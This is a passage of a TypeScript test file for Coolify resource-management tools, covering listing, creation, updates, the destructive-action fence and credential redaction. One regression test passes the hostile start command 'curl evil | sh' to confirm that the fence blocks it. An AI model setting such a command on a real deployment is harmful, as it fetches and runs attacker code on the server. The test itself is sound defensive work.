import { describe, it, expect, vi } from 'vitest';
import { TOOLS as resourceTools } from './resources.js';
import { TOOLS as storageTools } from './storage.js';
import { TOOLS as backupTools } from './backups.js';
import { TOOLS as scheduledTaskTools } from './scheduled-tasks.js';
import type { ToolContext } from './types.js';
import type { InstanceConfig } from '../../core/config.js';

// manage_storage / manage_backups / manage_scheduled_tasks live in their own
// modules now; aggregate so the describe blocks below resolve every tool by name.
const TOOLS = [...resourceTools, ...storageTools, ...backupTools, ...scheduledTaskTools];

function makeCtx(overrides: Partial<ToolContext> = {}): ToolContext {
  return {
    api: {
      resources: vi.fn<(...args: any[]) => any>(),
      applications: {
        get: vi.fn<(...args: any[]) => any>(),
        createPublic: vi.fn<(...args: any[]) => any>(),
        createPrivateGithubApp: vi.fn<(...args: any[]) => any>(),
        createPrivateDeployKey: vi.fn<(...args: any[]) => any>(),
        createDockerfile: vi.fn<(...args: any[]) => any>(),
        createDockerimage: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
      databases: {
        get: vi.fn<(...args: any[]) => any>(),
        create: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
      services: {
        get: vi.fn<(...args: any[]) => any>(),
        create: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
    } as unknown as ToolContext['api'],
    config: {
      name: 'default',
      baseUrl: 'http://coolify.test',
      token: '1|secret',
      extraHeaders: {},
      enableHostOps: false,
      allowDestructive: false,
    } as InstanceConfig,
    hostOps: async () => {
      throw new Error('no host ops');
    },
    resolver: {} as ToolContext['resolver'],
    ...overrides,
  } as ToolContext;
}

function findTool(name: string) {
  const t = TOOLS.find((t) => t.name === name);
  if (!t) throw new Error(`Tool ${name} not found`);
  return t;
}

describe('list_resources', () => {
  it('returns projected resources list from api.resources()', async () => {
    const ctx = makeCtx();
    const raw = [
      {
        uuid: 'abc123',
        name: 'myapp',
        status: 'running',
        fqdn: 'https://myapp.example.com',
        build_pack: 'nixpacks',
        git_repository: 'github.com/user/repo',
        server_uuid: 'srv1',
        type: 'application',
        extra: 'drop',
      },
      {
        uuid: 'def456',
        name: 'mydb',
        status: 'running',
        type: 'postgresql',
        server_uuid: 'srv1',
        extra: 'drop',
      },
    ];
    (ctx.api.resources as ReturnType<typeof vi.fn>).mockResolvedValueOnce(raw);

    const tool = findTool('list_resources');
    const result = await tool.handler({}, ctx);

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect(Array.isArray(r.resources)).toBe(true);
    const resources = r.resources as Record<string, unknown>[];
    expect(resources[0].uuid).toBe('abc123');
    expect(resources[0].extra).toBeUndefined();
    expect(resources[1].uuid).toBe('def456');
    expect(resources[1].extra).toBeUndefined();
  });

  it('filters by type when provided', async () => {
    const ctx = makeCtx();
    const raw = [
      {
        uuid: 'abc123',
        name: 'myapp',
        status: 'running',
        type: 'application',
        server_uuid: 'srv1',
      },
      { uuid: 'def456', name: 'mydb', status: 'running', type: 'postgresql', server_uuid: 'srv1' },
    ];
    (ctx.api.resources as ReturnType<typeof vi.fn>).mockResolvedValueOnce(raw);

    const tool = findTool('list_resources');
    const result = await tool.handler({ type: 'application' }, ctx);

    expect(result.status).toBe('ok');
    const resources = (result as Record<string, unknown>).resources as Record<string, unknown>[];
    expect(resources).toHaveLength(1);
    expect(resources[0].uuid).toBe('abc123');
  });

  // Regression (found live against Coolify 4.3.10): /resources rows carry
  // singular/specific type values ("application", "service", "standalone-*"),
  // so the plural enum filter must map to them instead of comparing literally
  // (which silently returned an empty list for every filtered call).
  it('maps the plural type filter onto live singular/standalone-* row types', async () => {
    const raw = [
      { uuid: 'app1', name: 'myapp', status: 'running', type: 'application', server_uuid: 'srv1' },
      { uuid: 'svc1', name: 'minio', status: 'running', type: 'service', server_uuid: 'srv1' },
      {
        uuid: 'pg1',
        name: 'POSTGRES',
        status: 'running',
        type: 'standalone-postgresql',
        server_uuid: 'srv1',
      },
      {
        uuid: 'rd1',
        name: 'Redis',
        status: 'running',
        type: 'standalone-redis',
        server_uuid: 'srv1',
      },
    ];
    const tool = findTool('list_resources');

    const cases: [string, string[]][] = [
      ['applications', ['app1']],
      ['services', ['svc1']],
      ['databases', ['pg1', 'rd1']],
    ];
    for (const [filter, expected] of cases) {
      const ctx = makeCtx();
      (ctx.api.resources as ReturnType<typeof vi.fn>).mockResolvedValueOnce(raw);
      const result = await tool.handler({ type: filter }, ctx);
      expect(result.status).toBe('ok');
      const resources = (result as Record<string, unknown>).resources as Record<string, unknown>[];
      expect(resources.map((r) => r.uuid)).toEqual(expected);
    }
  });

  it('returns error when api.resources() throws', async () => {
    const ctx = makeCtx();
    (ctx.api.resources as ReturnType<typeof vi.fn>).mockRejectedValueOnce(
      new Error('network fail'),
    );

    const tool = findTool('list_resources');
    const result = await tool.handler({}, ctx);

    expect(result.status).toBe('error');
  });
});

describe('get_resource', () => {
  it('fetches application by uuid', async () => {
    const ctx = makeCtx();
    const appData = {
      uuid: 'abc123',
      name: 'myapp',
      status: 'running',
      fqdn: 'https://myapp.example.com',
      build_pack: 'nixpacks',
      git_repository: 'github.com/user/repo',
      server_uuid: 'srv1',
      secret: 'should-stay',
    };
    (ctx.api.applications.get as ReturnType<typeof vi.fn>).mockResolvedValueOnce(appData);

    const tool = findTool('get_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'abc123' }, ctx);

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect((r.resource as Record<string, unknown>).uuid).toBe('abc123');
    expect((r.resource as Record<string, unknown>).name).toBe('myapp');
  });

  it('fetches database by uuid', async () => {
    const ctx = makeCtx();
    const dbData = {
      uuid: 'def456',
      name: 'mydb',
      status: 'running',
      type: 'postgresql',
      server_uuid: 'srv1',
    };
    (ctx.api.databases.get as ReturnType<typeof vi.fn>).mockResolvedValueOnce(dbData);

    const tool = findTool('get_resource');
    const result = await tool.handler({ type: 'databases', uuid: 'def456' }, ctx);

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect((r.resource as Record<string, unknown>).uuid).toBe('def456');
  });

  it('fetches service by uuid', async () => {
    const ctx = makeCtx();
    const svcData = { uuid: 'ghi789', name: 'mysvc', status: 'running', server_uuid: 'srv1' };
    (ctx.api.services.get as ReturnType<typeof vi.fn>).mockResolvedValueOnce(svcData);

    const tool = findTool('get_resource');
    const result = await tool.handler({ type: 'services', uuid: 'ghi789' }, ctx);

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect((r.resource as Record<string, unknown>).uuid).toBe('ghi789');
  });

  it('returns invalid_input for unknown type', async () => {
    const ctx = makeCtx();
    const tool = findTool('get_resource');
    const result = await tool.handler({ type: 'unknown_type', uuid: 'abc123' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('returns invalid_input for invalid uuid', async () => {
    const ctx = makeCtx();
    const tool = findTool('get_resource');
    const result = await tool.handler({ type: 'applications', uuid: 'not valid!' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });
});

function makeDestructiveCtxBase(): ToolContext {
  return {
    api: {
      resources: vi.fn<(...args: any[]) => any>(),
      applications: {
        get: vi.fn<(...args: any[]) => any>(),
        createPublic: vi.fn<(...args: any[]) => any>(),
        createPrivateGithubApp: vi.fn<(...args: any[]) => any>(),
        createPrivateDeployKey: vi.fn<(...args: any[]) => any>(),
        createDockerfile: vi.fn<(...args: any[]) => any>(),
        createDockerimage: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
      databases: {
        get: vi.fn<(...args: any[]) => any>(),
        create: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
      services: {
        get: vi.fn<(...args: any[]) => any>(),
        create: vi.fn<(...args: any[]) => any>(),
        update: vi.fn<(...args: any[]) => any>(),
        control: vi.fn<(...args: any[]) => any>(),
      },
    } as unknown as ToolContext['api'],
    config: {
      name: 'default',
      baseUrl: 'http://coolify.test',
      token: '1|secret',
      extraHeaders: {},
      enableHostOps: false,
      allowDestructive: true,
    } as InstanceConfig,
    hostOps: async () => {
      throw new Error('no host ops');
    },
    resolver: {} as ToolContext['resolver'],
  } as ToolContext;
}

describe('create_resource', () => {
  it('creates a public application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp1',
    });

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp1');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createPublic).toHaveBeenCalledWith(
      expect.objectContaining({ git_repository: 'https://github.com/user/repo' }),
    );
  });

  // Regression (found in live bring-up): Coolify's create endpoints reject unknown
  // fields with HTTP 422 ("This field is not allowed."). The fencing-only fields
  // confirm/dry_run (and the discriminators) must NOT be forwarded to the API body.
  it('does not forward confirm/dry_run/discriminators into the create body', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp1',
    });
    const tool = findTool('create_resource');
    await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
        confirm: true,
        dry_run: false,
      },
      ctx,
    );
    const body = (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mock
      .calls[0]![0] as Record<string, unknown>;
    expect(body).not.toHaveProperty('confirm');
    expect(body).not.toHaveProperty('dry_run');
    expect(body).not.toHaveProperty('kind');
    expect(body).not.toHaveProperty('source');
    expect(body.git_repository).toBe('https://github.com/user/repo');
  });

  it('creates a private github-app application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createPrivateGithubApp as ReturnType<typeof vi.fn>).mockResolvedValueOnce(
      { uuid: 'newapp2' },
    );

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'private-github-app',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        github_app_uuid: 'ghapp1',
        git_repository: 'github.com/user/privaterepo',
        git_branch: 'main',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp2');
  });

  it('creates a private deploy-key application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createPrivateDeployKey as ReturnType<typeof vi.fn>).mockResolvedValueOnce(
      { uuid: 'newapp3' },
    );

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'private-deploy-key',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        private_key_uuid: 'key1',
        git_repository: 'git@github.com:user/repo.git',
        git_branch: 'main',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp3');
  });

  it('creates a dockerfile application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createDockerfile as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp4',
    });

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'dockerfile',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        dockerfile: 'FROM node:20\nCMD node index.js',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp4');
  });

  it('creates a dockerimage application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createDockerimage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp5',
    });

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'dockerimage',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        docker_image: 'nginx:latest',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp5');
  });

  it('returns invalid_input for unknown application source', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'unknown-source',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('creates a database', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.databases.create as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newdb1',
    });

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'database',
        engine: 'postgresql',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        name: 'mydb',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newdb1');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.create).toHaveBeenCalledWith(
      'postgresql',
      expect.objectContaining({ name: 'mydb' }),
    );
  });

  it('returns invalid_input when engine is missing for database', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'database',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('creates a service with type', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.services.create as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newsvc1',
    });

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'service',
        service_type: 'plausible-analytics',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        name: 'analytics',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newsvc1');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.services.create).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'plausible-analytics' }),
    );
  });

  it('creates a service with docker_compose_raw (base64 encoded)', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.services.create as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newsvc2',
    });

    const composeContent = "version: '3'\nservices:\n  web:\n    image: nginx";
    const base64Compose = Buffer.from(composeContent).toString('base64');

    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'service',
        docker_compose_raw: base64Compose,
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newsvc2');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.services.create).toHaveBeenCalledWith(
      expect.objectContaining({ docker_compose_raw: base64Compose }),
    );
  });

  it('returns invalid_input when service has neither type nor docker_compose_raw', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'service',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('returns invalid_input when service has both type and docker_compose_raw', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'service',
        service_type: 'plausible-analytics',
        docker_compose_raw: 'dmVyc2lvbjogJzMn',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  it('returns invalid_input for unknown kind', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('create_resource');
    const result = await tool.handler(
      { kind: 'unknown_kind', server_uuid: 'srv1', confirm: true },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });

  // H2R2 regression: create_resource is fenced (code/credential write)
  it('create_resource: destructive_blocked when allowDestructive is false', async () => {
    const ctx = makeCtx(); // allowDestructive: false
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'destructive_blocked',
    });
  });

  it('create_resource: confirmation_required when allowDestructive=true but no confirm', async () => {
    const ctx = makeCtx({
      config: {
        name: 'default',
        baseUrl: 'http://coolify.test',
        token: '1|secret',
        extraHeaders: {},
        enableHostOps: false,
        allowDestructive: true,
      } as InstanceConfig,
    });
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect((result as Record<string, unknown>).error as Record<string, unknown>).toMatchObject({
      kind: 'confirmation_required',
    });
  });

  it('create_resource: dry_run returns preview without calling API', async () => {
    const ctx = makeCtx({
      config: {
        name: 'default',
        baseUrl: 'http://coolify.test',
        token: '1|secret',
        extraHeaders: {},
        enableHostOps: false,
        allowDestructive: true,
      } as InstanceConfig,
    });
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
        dry_run: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).dry_run).toBe(true);
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createPublic).not.toHaveBeenCalled();
  });

  it('create_resource: succeeds with allowDestructive=true and confirm=true', async () => {
    const ctx = makeCtx({
      config: {
        name: 'default',
        baseUrl: 'http://coolify.test',
        token: '1|secret',
        extraHeaders: {},
        enableHostOps: false,
        allowDestructive: true,
      } as InstanceConfig,
    });
    (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp1',
    });
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    expect((result as Record<string, unknown>).uuid).toBe('newapp1');
  });

  it('declares build_pack and the fields pass-through in the input schema', () => {
    const tool = findTool('create_resource');
    const schema = tool.inputSchema as {
      properties?: Record<
        string,
        { type?: string; enum?: string[]; additionalProperties?: boolean }
      >;
    };
    expect(schema.properties?.build_pack?.type).toBe('string');
    expect(schema.properties?.build_pack?.enum).toEqual(
      expect.arrayContaining(['nixpacks', 'static', 'dockerfile', 'dockercompose']),
    );
    expect(schema.properties?.fields?.type).toBe('object');
    expect(schema.properties?.fields?.additionalProperties).toBe(true);
    expect(schema.properties?.fields_json?.type).toBe('string');
  });

  it('merges `fields` into the application create body', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.createPublic as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newapp2',
    });
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'application',
        source: 'public',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        git_repository: 'https://github.com/user/repo',
        git_branch: 'main',
        name: 'myapp',
        build_pack: 'nixpacks',
        fields: { ports_exposes: '3000', base_directory: '/apps/web' },
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.createPublic).toHaveBeenCalledWith(
      expect.objectContaining({
        build_pack: 'nixpacks',
        ports_exposes: '3000',
        base_directory: '/apps/web',
        name: 'myapp',
      }),
    );
  });

  it('merges `fields` into the database create body', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.databases.create as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'newdb1',
    });
    const tool = findTool('create_resource');
    const result = await tool.handler(
      {
        kind: 'database',
        engine: 'postgresql',
        server_uuid: 'srv1',
        environment_name: 'production',
        project_uuid: 'proj1',
        fields: { postgres_user: 'admin', is_public: false },
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.create).toHaveBeenCalledWith(
      'postgresql',
      expect.objectContaining({ postgres_user: 'admin', is_public: false }),
    );
  });
});

describe('update_resource', () => {
  it('updates an application', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
      name: 'renamed-app',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', name: 'renamed-app', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    const r = result as Record<string, unknown>;
    expect((r.resource as Record<string, unknown>).name).toBe('renamed-app');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', { name: 'renamed-app' });
  });

  it('updates a database', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.databases.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'def456',
      name: 'renamed-db',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'databases', uuid: 'def456', name: 'renamed-db', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.databases.update).toHaveBeenCalledWith('def456', { name: 'renamed-db' });
  });

  it('updates a service', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.services.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'ghi789',
      name: 'renamed-svc',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'services', uuid: 'ghi789', name: 'renamed-svc', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.services.update).toHaveBeenCalledWith('ghi789', { name: 'renamed-svc' });
  });

  it('unwraps the declared `fields` object into the update body', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        fields: { post_deployment_command: 'php artisan migrate', ports_exposes: '8080' },
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', {
      post_deployment_command: 'php artisan migrate',
      ports_exposes: '8080',
    });
  });

  it('merges top-level extras with `fields`, fields winning on conflict', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        name: 'top-level',
        fields: { name: 'from-fields', start_command: 'npm start' },
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', {
      name: 'from-fields',
      start_command: 'npm start',
    });
  });

  it('accepts empty `fields` when top-level extras populate the body', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
      name: 'renamed',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', fields: {}, name: 'renamed', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', { name: 'renamed' });
  });

  it('accepts `fields_json` as a JSON-encoded alternative to `fields`', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        fields_json:
          '{"start_command":"npm start","health_check_enabled":true,"health_check_retries":3}',
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', {
      start_command: 'npm start',
      health_check_enabled: true,
      health_check_retries: 3,
    });
  });

  it('returns invalid_input for malformed `fields_json`', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('update_resource');

    for (const fields_json of ['{not json', '"a string"', '[1,2]', 'null', 42]) {
      const result = await tool.handler(
        { type: 'applications', uuid: 'abc123', fields_json, confirm: true },
        ctx,
      );
      expect(result.status).toBe('error');
      const r = result as Record<string, unknown>;
      expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
    }
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('returns invalid_input when both `fields` and `fields_json` are provided', async () => {
    const ctx = makeDestructiveCtxBase();
    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        fields: { name: 'a' },
        fields_json: '{"name":"b"}',
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('error');
    expect(((result as Record<string, unknown>).error as Record<string, unknown>).kind).toBe(
      'invalid_input',
    );
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).not.toHaveBeenCalled();
  });

  it('remaps `fqdn` to `domains` for applications (Coolify rejects fqdn in PATCH)', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.applications.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'abc123',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        fields: { fqdn: 'https://app.example.com' },
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.update).toHaveBeenCalledWith('abc123', {
      domains: 'https://app.example.com',
    });
  });

  it('redacts credential fields echoed back in the update response', async () => {
    const ctx = makeDestructiveCtxBase();
    (ctx.api.databases.update as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'def456',
      name: 'mydb',
      postgres_password: 's3cret-value',
      internal_db_url: 'postgres://coolify:s3cret-value@host/db',
    });

    const tool = findTool('update_resource');
    const result = await tool.handler(
      {
        type: 'databases',
        uuid: 'def456',
        fields: { postgres_password: 's3cret-value' },
        confirm: true,
      },
      ctx,
    );

    expect(result.status).toBe('ok');
    const resource = (result as Record<string, unknown>).resource as Record<string, unknown>;
    expect(resource.name).toBe('mydb');
    expect(resource.postgres_password).toBe('***REDACTED***');
  });

  // H2R2 regression: update_resource is fenced (code-execution write — fields can
  // rewrite start_command / pre- / post_deployment_command).
  it('update_resource: destructive_blocked when allowDestructive=false', async () => {
    const ctx = makeCtx(); // allowDestructive: false
    const tool = findTool('update_resource');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', fields: { start_command: 'curl evil | sh' } },
      ctx,
    );
    expect(result.status).toBe('error');
